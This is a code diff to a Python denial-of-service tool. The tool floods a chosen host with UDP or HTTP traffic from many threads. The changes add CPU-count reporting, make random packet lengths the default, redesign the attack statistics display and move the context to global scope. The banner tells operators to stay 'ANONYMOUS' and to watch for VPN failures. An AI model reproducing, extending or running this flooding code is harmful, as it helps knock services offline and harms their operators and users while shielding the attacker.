@@ -8,6 +8,7 @@ import time
 import urllib.request
 from dataclasses import dataclass, field
 from optparse import OptionParser
+from os import cpu_count
 
 # Constants
 USAGE = 'Usage: python %prog [options] arg'
@@ -46,6 +47,7 @@ class Context:
     connections_check_time: int = 0
     errors: list[str] = field(default_factory=list)
 
+    cpu_count: int = 1
     show_statistics: bool = False
     current_ip = None
     getting_ip: bool = False
@@ -60,8 +62,9 @@ def init_context(_ctx, args):
 
     _ctx.threads = args[0].threads
 
-    _ctx.attack_method = args[0].attack_method
+    _ctx.attack_method = str(args[0].attack_method).lower()
     _ctx.random_packet_len = bool(args[0].random_packet_len)
+    _ctx.cpu_count = max(cpu_count() - 1, 1)
 
     _ctx.user_agents = readfile('useragents.txt')
     _ctx.base_headers = readfile('headers.txt')
@@ -104,7 +107,7 @@ def get_random_port():
 def down_it_udp(_ctx: Context):
     i = 1
     while True:
-        extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''
+        extra_data = get_random_string(1, 5000) if _ctx.random_packet_len else ''
 
         packet = str(
             "GET / HTTP/1.1\nHost: " + _ctx.host
@@ -180,7 +183,9 @@ def logo():
 ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
 
 It is the end user's responsibility to obey all applicable laws.
-It is just like a server testing script and Your IP is visible. Please, make sure you are anonymous!
+It is just like a server testing script and Your IP is visible.
+
+Please, make sure you are ANONYMOUS!
     \033[0m ''')
 
 
@@ -207,7 +212,7 @@ def parser_add_options(parser):
                       dest='threads', type='int', default=100,
                       help='threads (default: 100)')
     parser.add_option('-r', '--random_len',
-                      dest='random_packet_len', type='int',
+                      dest='random_packet_len', type='int', default=1,
                       help='Send random packets with random length')
     parser.add_option('-m', '--method',
                       dest='attack_method', type='str', default='udp',
@@ -245,7 +250,7 @@ def connect_host(_ctx: Context):
 def get_first_ip_part(ip: str) -> str:
     parts = ip.split('.')
     if len(parts) > 1:
-        return f"{parts[0]}.*"
+        return f"{parts[0]}.*.*.*"
     else:
         return parts[0]
 
@@ -253,18 +258,26 @@ def get_first_ip_part(ip: str) -> str:
 def show_info(_ctx: Context):
     """Prints attack info to console."""
     logo()
-    m = f"Your IP: \033[94m{get_first_ip_part(_ctx.start_ip)}\033[0m"
-    if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip:
-        m += f" \033[91mIP was changed, check VPN (current IP: {get_first_ip_part(_ctx.current_ip)})\033[0m\n"
-    else:
-        m += "\n"
-    m += f"Host, port: \033[94m{_ctx.host}:{_ctx.port}\033[0m\n"
-    m += f"Attack method: \033[94m{_ctx.attack_method}\033[0m\n"
-    m += f"Threads: \033[94m{_ctx.threads}\033[0m\n"
-    if _ctx.attack_method == 'udp' and _ctx.random_packet_len:
-        m += f"Random packet length: yes\n"
-    m += '\n'
-    sys.stdout.write(m)
+
+    my_ip_masked = get_first_ip_part(_ctx.start_ip)
+
+    your_ip = f'\033[94m{my_ip_masked}\033[0m'
+    check_vpn = f'\033[91mIP was changed, check VPN (current IP: {my_ip_masked})\033[0m' if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
+    target_host = f'\033[94m{_ctx.host}:{_ctx.port}\033[0m'
+    load_method = f'\033[94m{str(_ctx.attack_method).upper()}\033[0m'
+    thread_pool = f'\033[94m{_ctx.threads}\033[0m'
+    available_cpu = f'\033[94m{_ctx.cpu_count}\033[0m'
+    rnd_packet_len = f'\033[94mYES\033[0m' if (_ctx.attack_method == 'udp' and _ctx.random_packet_len) else f'\033[94mNO\033[0m'
+
+    print('------------------------------------------------------')
+    print(f'Your IP:                    {your_ip} {check_vpn}')
+    print(f'Host:                       {target_host}')
+    print(f'Load Method:                {load_method}')
+    print(f'Threads:                    {thread_pool}')
+    print(f'CPU count:                  {available_cpu}')
+    print(f'Random Packet Length:       {rnd_packet_len}')
+    print('------------------------------------------------------')
+
     sys.stdout.flush()
 
 
@@ -282,22 +295,16 @@ def show_statistics(_ctx: Context):
 
     print("\033c")
     show_info(_ctx)
-    packets_sent = str(_ctx.packets_sent)
-    connections_success = str(_ctx.connections_success)
-    connections_failed = str(_ctx.connections_failed)
 
-    m = ''
-    if _ctx.attack_method == 'udp':
-        m = f"UDP packets sent: \033[92m{packets_sent}\033[0;0m; "
-    elif _ctx.attack_method == 'http':
-        m = f"HTTP requests sent: \033[92m{packets_sent}\033[0;0m. "
+    packets_sent = f'\033[94m{_ctx.packets_sent}\033[0;0m'
+    connections_success = f'\033[92m{_ctx.connections_success}\033[0;0m'
+    connections_failed = f'\033[91m{_ctx.connections_failed}\033[0;0m'
 
-    m += f"\nConnections: successful - \033[92m{connections_success}\033[0;0m, failed - \033[91m{connections_failed}\033[0m"
+    print(f'Packets Sent:               {packets_sent}')
+    print(f'Connection Success:         {connections_success}')
+    print(f'Connection Failed:          {connections_failed}')
+    print('------------------------------------------------------')
 
-    for error in _ctx.errors:
-        m += f"\n{error}"
-
-    sys.stdout.write(m)
     sys.stdout.flush()
     time.sleep(3)
     _ctx.show_statistics = False
@@ -306,12 +313,14 @@ def show_statistics(_ctx: Context):
 def create_thread_pool(_ctx: Context) -> list:
     thread_pool = []
     for i in range(int(_ctx.threads)):
-        if _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
-        elif _ctx.attack_method == 'http':
+        if _ctx.attack_method == 'http':
             thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        else:  # _ctx.attack_method == 'udp':
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+
         thread_pool[i].daemon = True  # if thread is exist, it dies
         thread_pool[i].start()
+
     return thread_pool
 
 
@@ -355,8 +364,6 @@ def main():
     if len(sys.argv) < 2:
         usage(parser)
 
-    _ctx = Context()
-
     init_context(_ctx, args)
     current_ip = get_current_ip()
     if current_ip:
@@ -380,6 +387,10 @@ def main():
 
     while True:
         time.sleep(1)
+
+
+# Context should be in global scope
+_ctx = Context()
 
 
 if __name__ == '__main__':
